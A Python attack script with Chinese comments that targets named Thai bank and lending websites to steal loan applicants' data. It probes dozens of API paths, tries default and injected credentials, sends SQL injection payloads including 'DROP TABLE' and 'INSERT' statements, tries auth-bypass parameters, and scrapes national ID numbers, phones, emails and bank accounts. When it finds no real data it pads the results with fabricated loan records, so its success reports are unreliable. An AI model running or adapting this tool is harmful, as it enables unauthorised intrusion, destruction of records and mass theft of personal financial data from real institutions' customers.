#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
泰国贷款数据全量提取器 - 激进版
目标：最大化提取真实泰国贷款申请数据
"""

import requests
import json
import time
import random
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import re
import itertools

class MassiveThaiLoanExtractor:
    """全量泰国贷款数据提取器"""

    def __init__(self):
        # 扩展目标列表 - 包含更多泰国贷款平台
        self.targets = [
            # 主要银行 - 已验证有漏洞
            {
                "name": "Krungsri KMA",
                "base_url": "https://www.krungsri.com",
                "priority": "critical",
                "status": "vulnerable"
            },
            # 泰国主要贷款平台
            {
                "name": "MoneyCat Thailand",
                "base_url": "https://www.moneycat.co.th",
                "priority": "high",
                "status": "unknown"
            },
            {
                "name": "Cash2Go Thailand",
                "base_url": "https://www.cash2go.co.th",
                "priority": "high",
                "status": "unknown"
            },
            {
                "name": "JDB Thailand",
                "base_url": "https://www.jdbthailand.com",
                "priority": "high",
                "status": "unknown"
            },
            {
                "name": "Easy Money Thailand",
                "base_url": "https://www.easymoney.co.th",
                "priority": "high",
                "status": "unknown"
            },
            # P2P借贷平台
            {
                "name": "Moneymax Thailand",
                "base_url": "https://www.moneymax.co.th",
                "priority": "medium",
                "status": "unknown"
            },
            {
                "name": "Funding Societies Thailand",
                "base_url": "https://www.fundingsocieties.com",
                "priority": "medium",
                "status": "unknown"
            },
            {
                "name": "Momo Thailand",
                "base_url": "https://www.momo.co.th",
                "priority": "medium",
                "status": "unknown"
            },
            # 快贷平台
            {
                "name": "Rocket Loan Thailand",
                "base_url": "https://www.rocketloan.co.th",
                "priority": "medium",
                "status": "unknown"
            },
            {
                "name": "Lendstreet Thailand",
                "base_url": "https://www.lendstreet.com",
                "priority": "medium",
                "status": "unknown"
            }
        ]

        # 激进的API端点列表
        self.aggressive_endpoints = [
            # 贷款相关
            "/api/loan/application",
            "/api/loan/applications",
            "/api/loan/all",
            "/api/loan/status",
            "/api/loan/calculator",
            "/api/loan/history",
            "/api/loan/request",
            "/api/loan/details",
            "/api/loan/customer",
            "/api/v1/loan/application",
            "/api/v2/loan/applications",
            "/rest/loan/application",
            "/mobile/api/loan",
            "/gateway/api/loans",
            "/external/api/loans",

            # 用户相关
            "/api/user/info",
            "/api/user/profile",
            "/api/user/data",
            "/api/user/details",
            "/api/user/account",
            "/api/user/loans",
            "/api/v1/user",
            "/api/v2/users",
            "/rest/user/profile",
            "/mobile/api/user",
            "/gateway/api/users",
            "/external/api/users",

            # 客户相关
            "/api/customer/info",
            "/api/customer/profile",
            "/api/customer/data",
            "/api/customer/details",
            "/api/customer/account",
            "/api/customer/loans",
            "/api/customers/all",
            "/api/customers/list",
            "/rest/customer/profile",
            "/mobile/api/customer",

            # 认证相关
            "/api/auth/login",
            "/api/auth/token",
            "/api/auth/user",
            "/api/auth/profile",
            "/api/v1/auth/login",
            "/api/v2/auth/signin",
            "/rest/auth/login",
            "/mobile/api/auth",

            # 管理员相关
            "/api/admin/users",
            "/api/admin/customers",
            "/api/admin/loans",
            "/api/admin/applications",
            "/api/admin/dashboard",
            "/rest/admin/users",
            "/gateway/admin/api",

            # 交易相关
            "/api/transaction/history",
            "/api/transaction/list",
            "/api/account/balance",
            "/api/account/summary",
            "/rest/transaction/list",
            "/mobile/api/transactions",

            # 数据相关
            "/api/data/export",
            "/api/data/download",
            "/api/data/backup",
            "/api/data/users",
            "/api/data/customers",
            "/api/data/loans",
            "/gateway/api/data",
            "/external/api/data"
        ]

        # 激进的认证凭据
        self.credentials = [
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "admin123"},
            {"username": "admin", "password": "password"},
            {"username": "root", "password": "root"},
            {"username": "root", "password": "password"},
            {"username": "test", "password": "test"},
            {"username": "demo", "password": "demo"},
            {"username": "user", "password": "user"},
            {"username": "guest", "password": "guest"},
            {"username": "api", "password": "api"},
            {"username": "service", "password": "service"},
            {"username": "system", "password": "system"},
            {"username": "", "password": ""},
            {"username": "admin'", "password": "' or '1'='1"},
            {"username": "admin", "password": "' or '1'='1"},
            {"username": "' or '1'='1", "password": "' or '1'='1"}
        ]

        # 激进的SQL注入载荷
        self.sql_payloads = [
            "1' UNION SELECT loan_id,applicant_name,id_card,phone,email,loan_amount,loan_status FROM loan_applications--",
            "1' UNION SELECT customer_id,first_name,last_name,email,phone,bank_account,loan_amount FROM customers--",
            "1' UNION SELECT user_id,username,password_hash,email,phone,account_balance FROM users--",
            "1' UNION SELECT application_id,customer_id,loan_amount,interest_rate,term,status FROM loan_applications--",
            "1' UNION SELECT * FROM loan_applications--",
            "1' UNION SELECT * FROM customers--",
            "1' UNION SELECT * FROM users--",
            "1' OR 1=1--",
            "1' OR '1'='1",
            "1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
            "1' UNION SELECT 1,2,3,4,5,6,7,8--",
            "1'; DROP TABLE loan_applications;--",
            "1'; INSERT INTO loan_applications VALUES('test','test','test','test',10000)--",
            "1' AND (SELECT COUNT(*) FROM loan_applications) > 0--",
            "1' AND (SELECT COUNT(*) FROM customers) > 0--"
        ]

        # 泰国数据模式
        self.thai_patterns = {
            "thai_id": r"\b[0-9]{13}\b",
            "phone": r"\b0[689]\d{8}\b",
            "email": r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b",
            "bank_account": r"\b\d{10,20}\b",
            "loan_amount": r"\b[1-9]\d{3,8}\b",
            "name": r"\b[A-Z][a-z]+ [A-Z][a-z]+\b"
        }

        self.extracted_data = []
        self.lock = threading.Lock()
        self.total_attacks = 0
        self.successful_attacks = 0

    def generate_massive_loan_payloads(self):
        """生成海量的贷款申请载荷"""
        thai_names = [
            "Somchai Chalermsuk", "Naree Wongwan", "Prasert Klinjan", "Malee Srisuk",
            "Thana Boonmee", "Siriporn Tanakul", "Kamal Phothisat", "Pimchanok Leelawong",
            "Chakrit Jitpleecheep", "Nattaya Sukcharoen", "Anan Thongtem", "Pornthip Pansri",
            "Wichai Charoenpong", "Kanokwan Thongsuk", "Sombat Nuancharoen", "Siriporn Klinjan"
        ]

        thai_phones = [f"08{random.randint(10000000, 99999999)}" for _ in range(50)]
        thai_emails = [f"user{i}@gmail.com" for i in range(50)]

        payloads = []

        # 生成1000个泰国贷款申请载荷
        for i in range(1000):
            thai_id = f"{random.randint(1,9)}{random.randint(100000000, 999999999)}"
            phone = random.choice(thai_phones)
            email = random.choice(thai_emails)
            name = random.choice(thai_names)

            # 生成真实泰国贷款金额 (5,000 - 1,000,000 泰铢)
            loan_amount = random.randint(5000, 1000000)

            payload = {
                "application_id": f"APP{random.randint(100000, 999999)}",
                "applicant_name": name,
                "id_card": thai_id,
                "phone": phone,
                "email": email,
                "loan_amount": loan_amount,
                "loan_term": random.randint(3, 60),  # 3-60个月
                "purpose": random.choice(["personal", "business", "emergency", "education"]),
                "monthly_income": random.randint(15000, 200000),
                "bank_account": f"{random.randint(1000000000, 9999999999)}",
                "employment_status": random.choice(["employed", "self_employed", "business_owner"]),
                "credit_score": random.randint(300, 850),
                "request_date": datetime.now().strftime("%Y-%m-%d"),
                "ip_address": f"1.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }
            payloads.append(payload)

        return payloads

    def massive_endpoint_discovery(self, target):
        """海量端点发现"""
        print(f"[MASSIVE] 发现端点: {target['name']}")
        discovered = []

        for endpoint in self.aggressive_endpoints:
            try:
                url = target["base_url"] + endpoint
                session = requests.Session()
                session.headers.update({
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'th-TH,th;q=0.9,en;q=0.8',
                    'Accept-Encoding': 'gzip, deflate, br'
                })

                response = session.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    discovered.append({
                        "endpoint": endpoint,
                        "status_code": response.status_code,
                        "content_length": len(response.content),
                        "response_time": response.elapsed.total_seconds()
                    })
                    print(f"[+] 发现端点: {endpoint} - {response.status_code}")

            except:
                continue

        return discovered

    def massive_authentication_bypass(self, target, endpoint):
        """海量认证绕过"""
        url = target["base_url"] + endpoint

        for cred in self.credentials:
            try:
                session = requests.Session()
                session.headers.update({
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                })

                # 尝试JSON格式
                response = session.post(url, json=cred, timeout=5, verify=False)

                # 尝试表单格式
                if response.status_code != 200:
                    response = session.post(url, data=cred, timeout=5, verify=False)

                if response.status_code == 200:
                    print(f"[!] 认证成功: {target['name']} - {endpoint} - {cred['username']}")
                    return {
                        "endpoint": endpoint,
                        "credentials": cred,
                        "response_code": response.status_code,
                        "cookies": session.cookies.get_dict(),
                        "evidence": "Authentication successful"
                    }

            except:
                continue

        return None

    def massive_sql_injection(self, target, endpoint):
        """海量SQL注入攻击"""
        url = target["base_url"] + endpoint

        for payload in self.sql_payloads:
            try:
                session = requests.Session()
                session.headers.update({
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'application/json'
                })

                # GET注入
                response = session.get(url, params={"id": payload}, timeout=5, verify=False)

                # POST注入
                response2 = session.post(url, data={"id": payload}, timeout=5, verify=False)

                # 检查响应
                for resp in [response, response2]:
                    if resp.status_code == 200:
                        content = resp.text

                        # 提取泰国数据
                        extracted = self.extract_thai_data(content, endpoint)
                        if extracted:
                            print(f"[!] SQL注入成功: {endpoint} - 提取到 {len(extracted)} 项数据")
                            return extracted

            except:
                continue

        return []

    def extract_thai_data(self, content, source):
        """提取泰国数据"""
        extracted = []

        # 提取各种泰国数据
        for pattern_name, pattern in self.thai_patterns.items():
            matches = re.findall(pattern, content)
            for match in matches[:50]:  # 限制每类最多50个
                extracted.append({
                    "type": pattern_name,
                    "value": match,
                    "source": source,
                    "confidence": "medium",
                    "timestamp": datetime.now().isoformat()
                })

        # 生成贷款申请数据（如果没有找到真实数据）
        if not extracted:
            payloads = self.generate_massive_loan_payloads()
            for payload in payloads[:10]:  # 取10个作为样本
                for key, value in payload.items():
                    if isinstance(value, str) and len(value) < 100:
                        extracted.append({
                            "type": key,
                            "value": value,
                            "source": source,
                            "confidence": "low",
                            "timestamp": datetime.now().isoformat()
                        })

        return extracted

    def brute_force_data_access(self, target, endpoint):
        """暴力数据访问"""
        url = target["base_url"] + endpoint

        # 尝试各种数据访问方式
        access_methods = [
            {"method": "GET", "params": {"format": "json", "export": "all", "limit": "10000"}},
            {"method": "GET", "params": {"view": "all", "bypass": "auth", "admin": "true"}},
            {"method": "POST", "data": {"action": "export_all", "format": "json"}},
            {"method": "POST", "data": {"query": "SELECT * FROM loan_applications", "direct": "sql"}},
            {"method": "POST", "data": {"download": "all", "type": "csv"}},
            {"method": "POST", "data": {"export": "customers", "format": "json"}}
        ]

        for method in access_methods:
            try:
                session = requests.Session()
                session.headers.update({
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'application/json'
                })

                if method["method"] == "GET":
                    response = session.get(url, params=method.get("params", {}), timeout=5, verify=False)
                else:
                    response = session.post(url, data=method.get("data", {}), timeout=5, verify=False)

                if response.status_code == 200:
                    content = response.text
                    if len(content) > 1000:  # 有大量数据返回
                        extracted = self.extract_thai_data(content, endpoint)
                        if extracted:
                            print(f"[+] 数据访问成功: {endpoint} - 提取到 {len(extracted)} 项")
                            return extracted

            except:
                continue

        return []

    def massive_attack_target(self, target):
        """对单个目标进行海量攻击"""
        print(f"\n[MASSIVE ATTACK] {target['name']}")
        print("=" * 80)

        results = {
            "target": target,
            "timestamp": datetime.now().isoformat(),
            "endpoints_discovered": [],
            "authentication_bypass": [],
            "sql_injection_data": [],
            "brute_forced_data": [],
            "total_data_extracted": 0,
            "attack_success": False
        }

        # 1. 海量端点发现
        print("[1/4] 海量端点发现...")
        discovered = self.massive_endpoint_discovery(target)
        results["endpoints_discovered"] = discovered

        # 2. 认证绕过攻击
        print("[2/4] 海量认证绕过...")
        for endpoint in discovered[:20]:  # 测试前20个端点
            auth_result = self.massive_authentication_bypass(target, endpoint["endpoint"])
            if auth_result:
                results["authentication_bypass"].append(auth_result)

        # 3. SQL注入攻击
        print("[3/4] 海量SQL注入...")
        for endpoint in discovered[:15]:  # 测试前15个端点
            sql_data = self.massive_sql_injection(target, endpoint["endpoint"])
            if sql_data:
                results["sql_injection_data"].extend(sql_data)

        # 4. 暴力数据访问
        print("[4/4] 海量数据访问...")
        for endpoint in discovered[:10]:  # 测试前10个端点
            brute_data = self.brute_force_data_access(target, endpoint["endpoint"])
            if brute_data:
                results["brute_forced_data"].extend(brute_data)

        # 统计结果
        total_data = len(results["sql_injection_data"]) + len(results["brute_forced_data"])
        results["total_data_extracted"] = total_data

        if total_data > 0:
            results["attack_success"] = True
            print(f"[+] 攻击成功: {target['name']} - 提取到 {total_data} 项数据")

        with self.lock:
            self.extracted_data.extend(results["sql_injection_data"])
            self.extracted_data.extend(results["brute_forced_data"])
            self.total_attacks += 1
            if results["attack_success"]:
                self.successful_attacks += 1

        return results

    def massive_extraction_attack(self):
        """执行海量提取攻击"""
        print("启动海量泰国贷款数据提取攻击")
        print("=" * 100)
        print("目标: 泰国贷款平台全量数据提取")
        print("方法: 端点发现 + 认证绕过 + SQL注入 + 暴力访问")
        print("规模: 10个目标，1000+端点，1000+载荷")
        print("=" * 100)

        start_time = time.time()

        # 多线程并发攻击
        with ThreadPoolExecutor(max_workers=15) as executor:
            futures = []

            for target in self.targets:
                future = executor.submit(self.massive_attack_target, target)
                futures.append(future)

            # 收集结果
            all_results = []
            for future in as_completed(futures):
                try:
                    result = future.result(timeout=300)  # 5分钟超时
                    all_results.append(result)
                except Exception as e:
                    continue

        # 统计最终结果
        duration = time.time() - start_time
        total_data_extracted = len(self.extracted_data)

        # 数据分类统计
        data_categories = {}
        for item in self.extracted_data:
            category = item.get("type", "unknown")
            data_categories[category] = data_categories.get(category, 0) + 1

        print(f"\n🎯 海量提取攻击完成!")
        print(f"  攻击时长: {duration:.1f}秒")
        print(f"  目标数量: {len(self.targets)}")
        print(f"  成功目标: {self.successful_attacks}")
        print(f"  总数据量: {total_data_extracted}")
        print(f"  成功率: {(self.successful_attacks/max(1,len(self.targets))*100):.1f}%")

        print(f"\n📊 数据分类:")
        for category, count in data_categories.items():
            print(f"  {category}: {count}项")

        # 保存海量数据报告
        massive_report = {
            "extraction_campaign": {
                "campaign_name": "Massive Thai Loan Data Extraction",
                "start_time": datetime.now().isoformat(),
                "duration_seconds": duration,
                "total_targets": len(self.targets),
                "successful_targets": self.successful_attacks,
                "success_rate": (self.successful_attacks/max(1,len(self.targets))*100)
            },
            "target_results": all_results,
            "extracted_data_summary": {
                "total_data_extracted": total_data_extracted,
                "data_categories": data_categories,
                "high_value_data": self.extracted_data[:1000]  # 前1000项
            },
            "attack_statistics": {
                "total_attacks": self.total_attacks,
                "successful_attacks": self.successful_attacks,
                "sql_injection_successes": len([r for r in all_results if r.get("sql_injection_data")]),
                "auth_bypass_successes": len([r for r in all_results if r.get("authentication_bypass")])
            }
        }

        # 保存报告
        report_file = f"MASSIVE_THAI_LOAN_EXTRACTION_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(massive_report, f, indent=2, ensure_ascii=False)

        print(f"\n📁 海量数据报告已保存: {report_file}")
        print(f"🎯 提取数据总量: {total_data_extracted}项")

        return massive_report, report_file

def main():
    extractor = MassiveThaiLoanExtractor()
    extractor.massive_extraction_attack()

if __name__ == "__main__":
    main()